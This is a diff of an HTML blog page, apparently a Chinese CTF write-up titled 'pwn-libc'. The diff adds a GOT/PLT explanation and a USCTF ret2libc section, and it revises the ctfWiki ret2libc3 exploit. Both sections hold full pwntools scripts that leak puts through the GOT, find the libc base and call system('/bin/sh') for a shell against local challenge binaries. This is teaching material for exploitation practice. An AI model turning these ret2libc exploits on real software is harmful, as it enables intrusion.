@@ -31,17 +31,19 @@
 <meta property="og:site_name" content="mark0519的博客">
 <meta property="og:description" content="pwn-libc在众多ROP方法中，重点是要找到system函数的地址来进行ROP，而有的elf源文件中并没有system函数，这是就可以利用libc system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。 所以如果我们知道 libc 中某个函数的地址，那么我们就可">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4bce71d0afff9fda662855b7058cbff9654bf8a6.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/edaf04621f07afcf30213dc71792080b2bc436c6.png">
 <meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c9c5e372d6870c9dbdf6c9c0b93913f8da086ad2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190324123353663.png">
 <meta property="article:published_time" content="2021-01-21T14:39:33.000Z">
-<meta property="article:modified_time" content="2021-01-21T15:02:42.555Z">
+<meta property="article:modified_time" content="2021-01-28T15:33:57.385Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4bce71d0afff9fda662855b7058cbff9654bf8a6.png">
 
 
 <link rel="canonical" href="https://mark0519.github.io/2021/01/21/pwn-libc/">
@@ -185,7 +187,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-libc"><span class="nav-number">1.</span> <span class="nav-text">pwn-libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfWiki-ret2libc3"><span class="nav-number">1.1.</span> <span class="nav-text">ctfWiki  ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-libc"><span class="nav-number">1.</span> <span class="nav-text">pwn-libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#got-amp-plt%E8%A1%A8"><span class="nav-number">1.1.</span> <span class="nav-text">got&amp;plt表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctfWiki-ret2libc3"><span class="nav-number">1.2.</span> <span class="nav-text">ctfWiki  ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#USCTF-ret2libc"><span class="nav-number">1.3.</span> <span class="nav-text">USCTF ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -277,10 +279,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2021-01-21 22:39:33 / 修改时间：23:02:42" itemprop="dateCreated datePublished" datetime="2021-01-21T22:39:33+08:00">2021-01-21</time>
+      <time title="创建时间：2021-01-21 22:39:33" itemprop="dateCreated datePublished" datetime="2021-01-21T22:39:33+08:00">2021-01-21</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-01-28 23:33:57" itemprop="dateModified" datetime="2021-01-28T23:33:57+08:00">2021-01-28</time>
+      </span>
 
   
 </div>
@@ -300,6 +308,11 @@
 <p><strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
 <a id="more"></a>
 
+<h2 id="got-amp-plt表"><a href="#got-amp-plt表" class="headerlink" title="got&amp;plt表"></a>got&amp;plt表</h2><p>获取数据段存放函数地址的那一小段代码称为PLT（Procedure Linkage Table）<strong>过程链接表</strong></p>
+<p>存放函数地址的数据段称为GOT（Global Offset Table）<strong>全局偏移表</strong>。</p>
+<p>当操作系统执行到scanf函数时，一般的调用即为：<strong>call scanf —&gt; scanf的plt表 —&gt;scanf的got表</strong></p>
+<p>即间接寻址可简化为下图</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4bce71d0afff9fda662855b7058cbff9654bf8a6.png"></p>
 <h2 id="ctfWiki-ret2libc3"><a href="#ctfWiki-ret2libc3" class="headerlink" title="ctfWiki  ret2libc3"></a>ctfWiki  ret2libc3</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先分析保护</p>
 <p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/18f4dd2967c898314a3d79a7069a23c91b491c7d.png"></p>
 <p>反汇编</p>
@@ -327,9 +340,23 @@
 <p>即得到payload2</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;b&#x27;</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>)  + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload1)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;zbrnb&quot;</span>.ljust(<span class="number">112</span>,<span class="string">&#x27;b&#x27;</span>) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ctfWiki上的给的exp在本地跑不通，我也不知道为啥</span></span><br><span class="line"><span class="comment">#这是一个可以本地跑通的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>)) <span class="comment">#32位程序，地址占4个字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;B&#x27;</span> * <span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;CCCC&#x27;</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
+<h2 id="USCTF-ret2libc"><a href="#USCTF-ret2libc" class="headerlink" title="USCTF ret2libc"></a>USCTF ret2libc</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>反汇编寻找泄漏点</p>
+<p><img src="https://img-blog.csdnimg.cn/20190324123353663.png"></p>
+<p>即发现puts函数可作为泄露函数</p>
+<p>栈溢出覆盖read的返回地址，得到payload1</p>
+<p>再有ida寻找到main函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(main)+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>
 
+<p>之后接收puts的地址，由LibcSearcher包提供的方法找到对应libc版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc =LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)  <span class="comment">#需要from LibcSearcher import *</span></span><br></pre></td></tr></table></figure>
+
+<p>随后计算偏移量得到paylod2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system)+<span class="string">&quot;aaaa&quot;</span>+p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<p>即可得到shell</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=<span class="number">0x80484FD</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(main)+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;try\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line"></span><br><span class="line">libcbase=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">&quot;aaaa&quot;</span>+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
     </div>
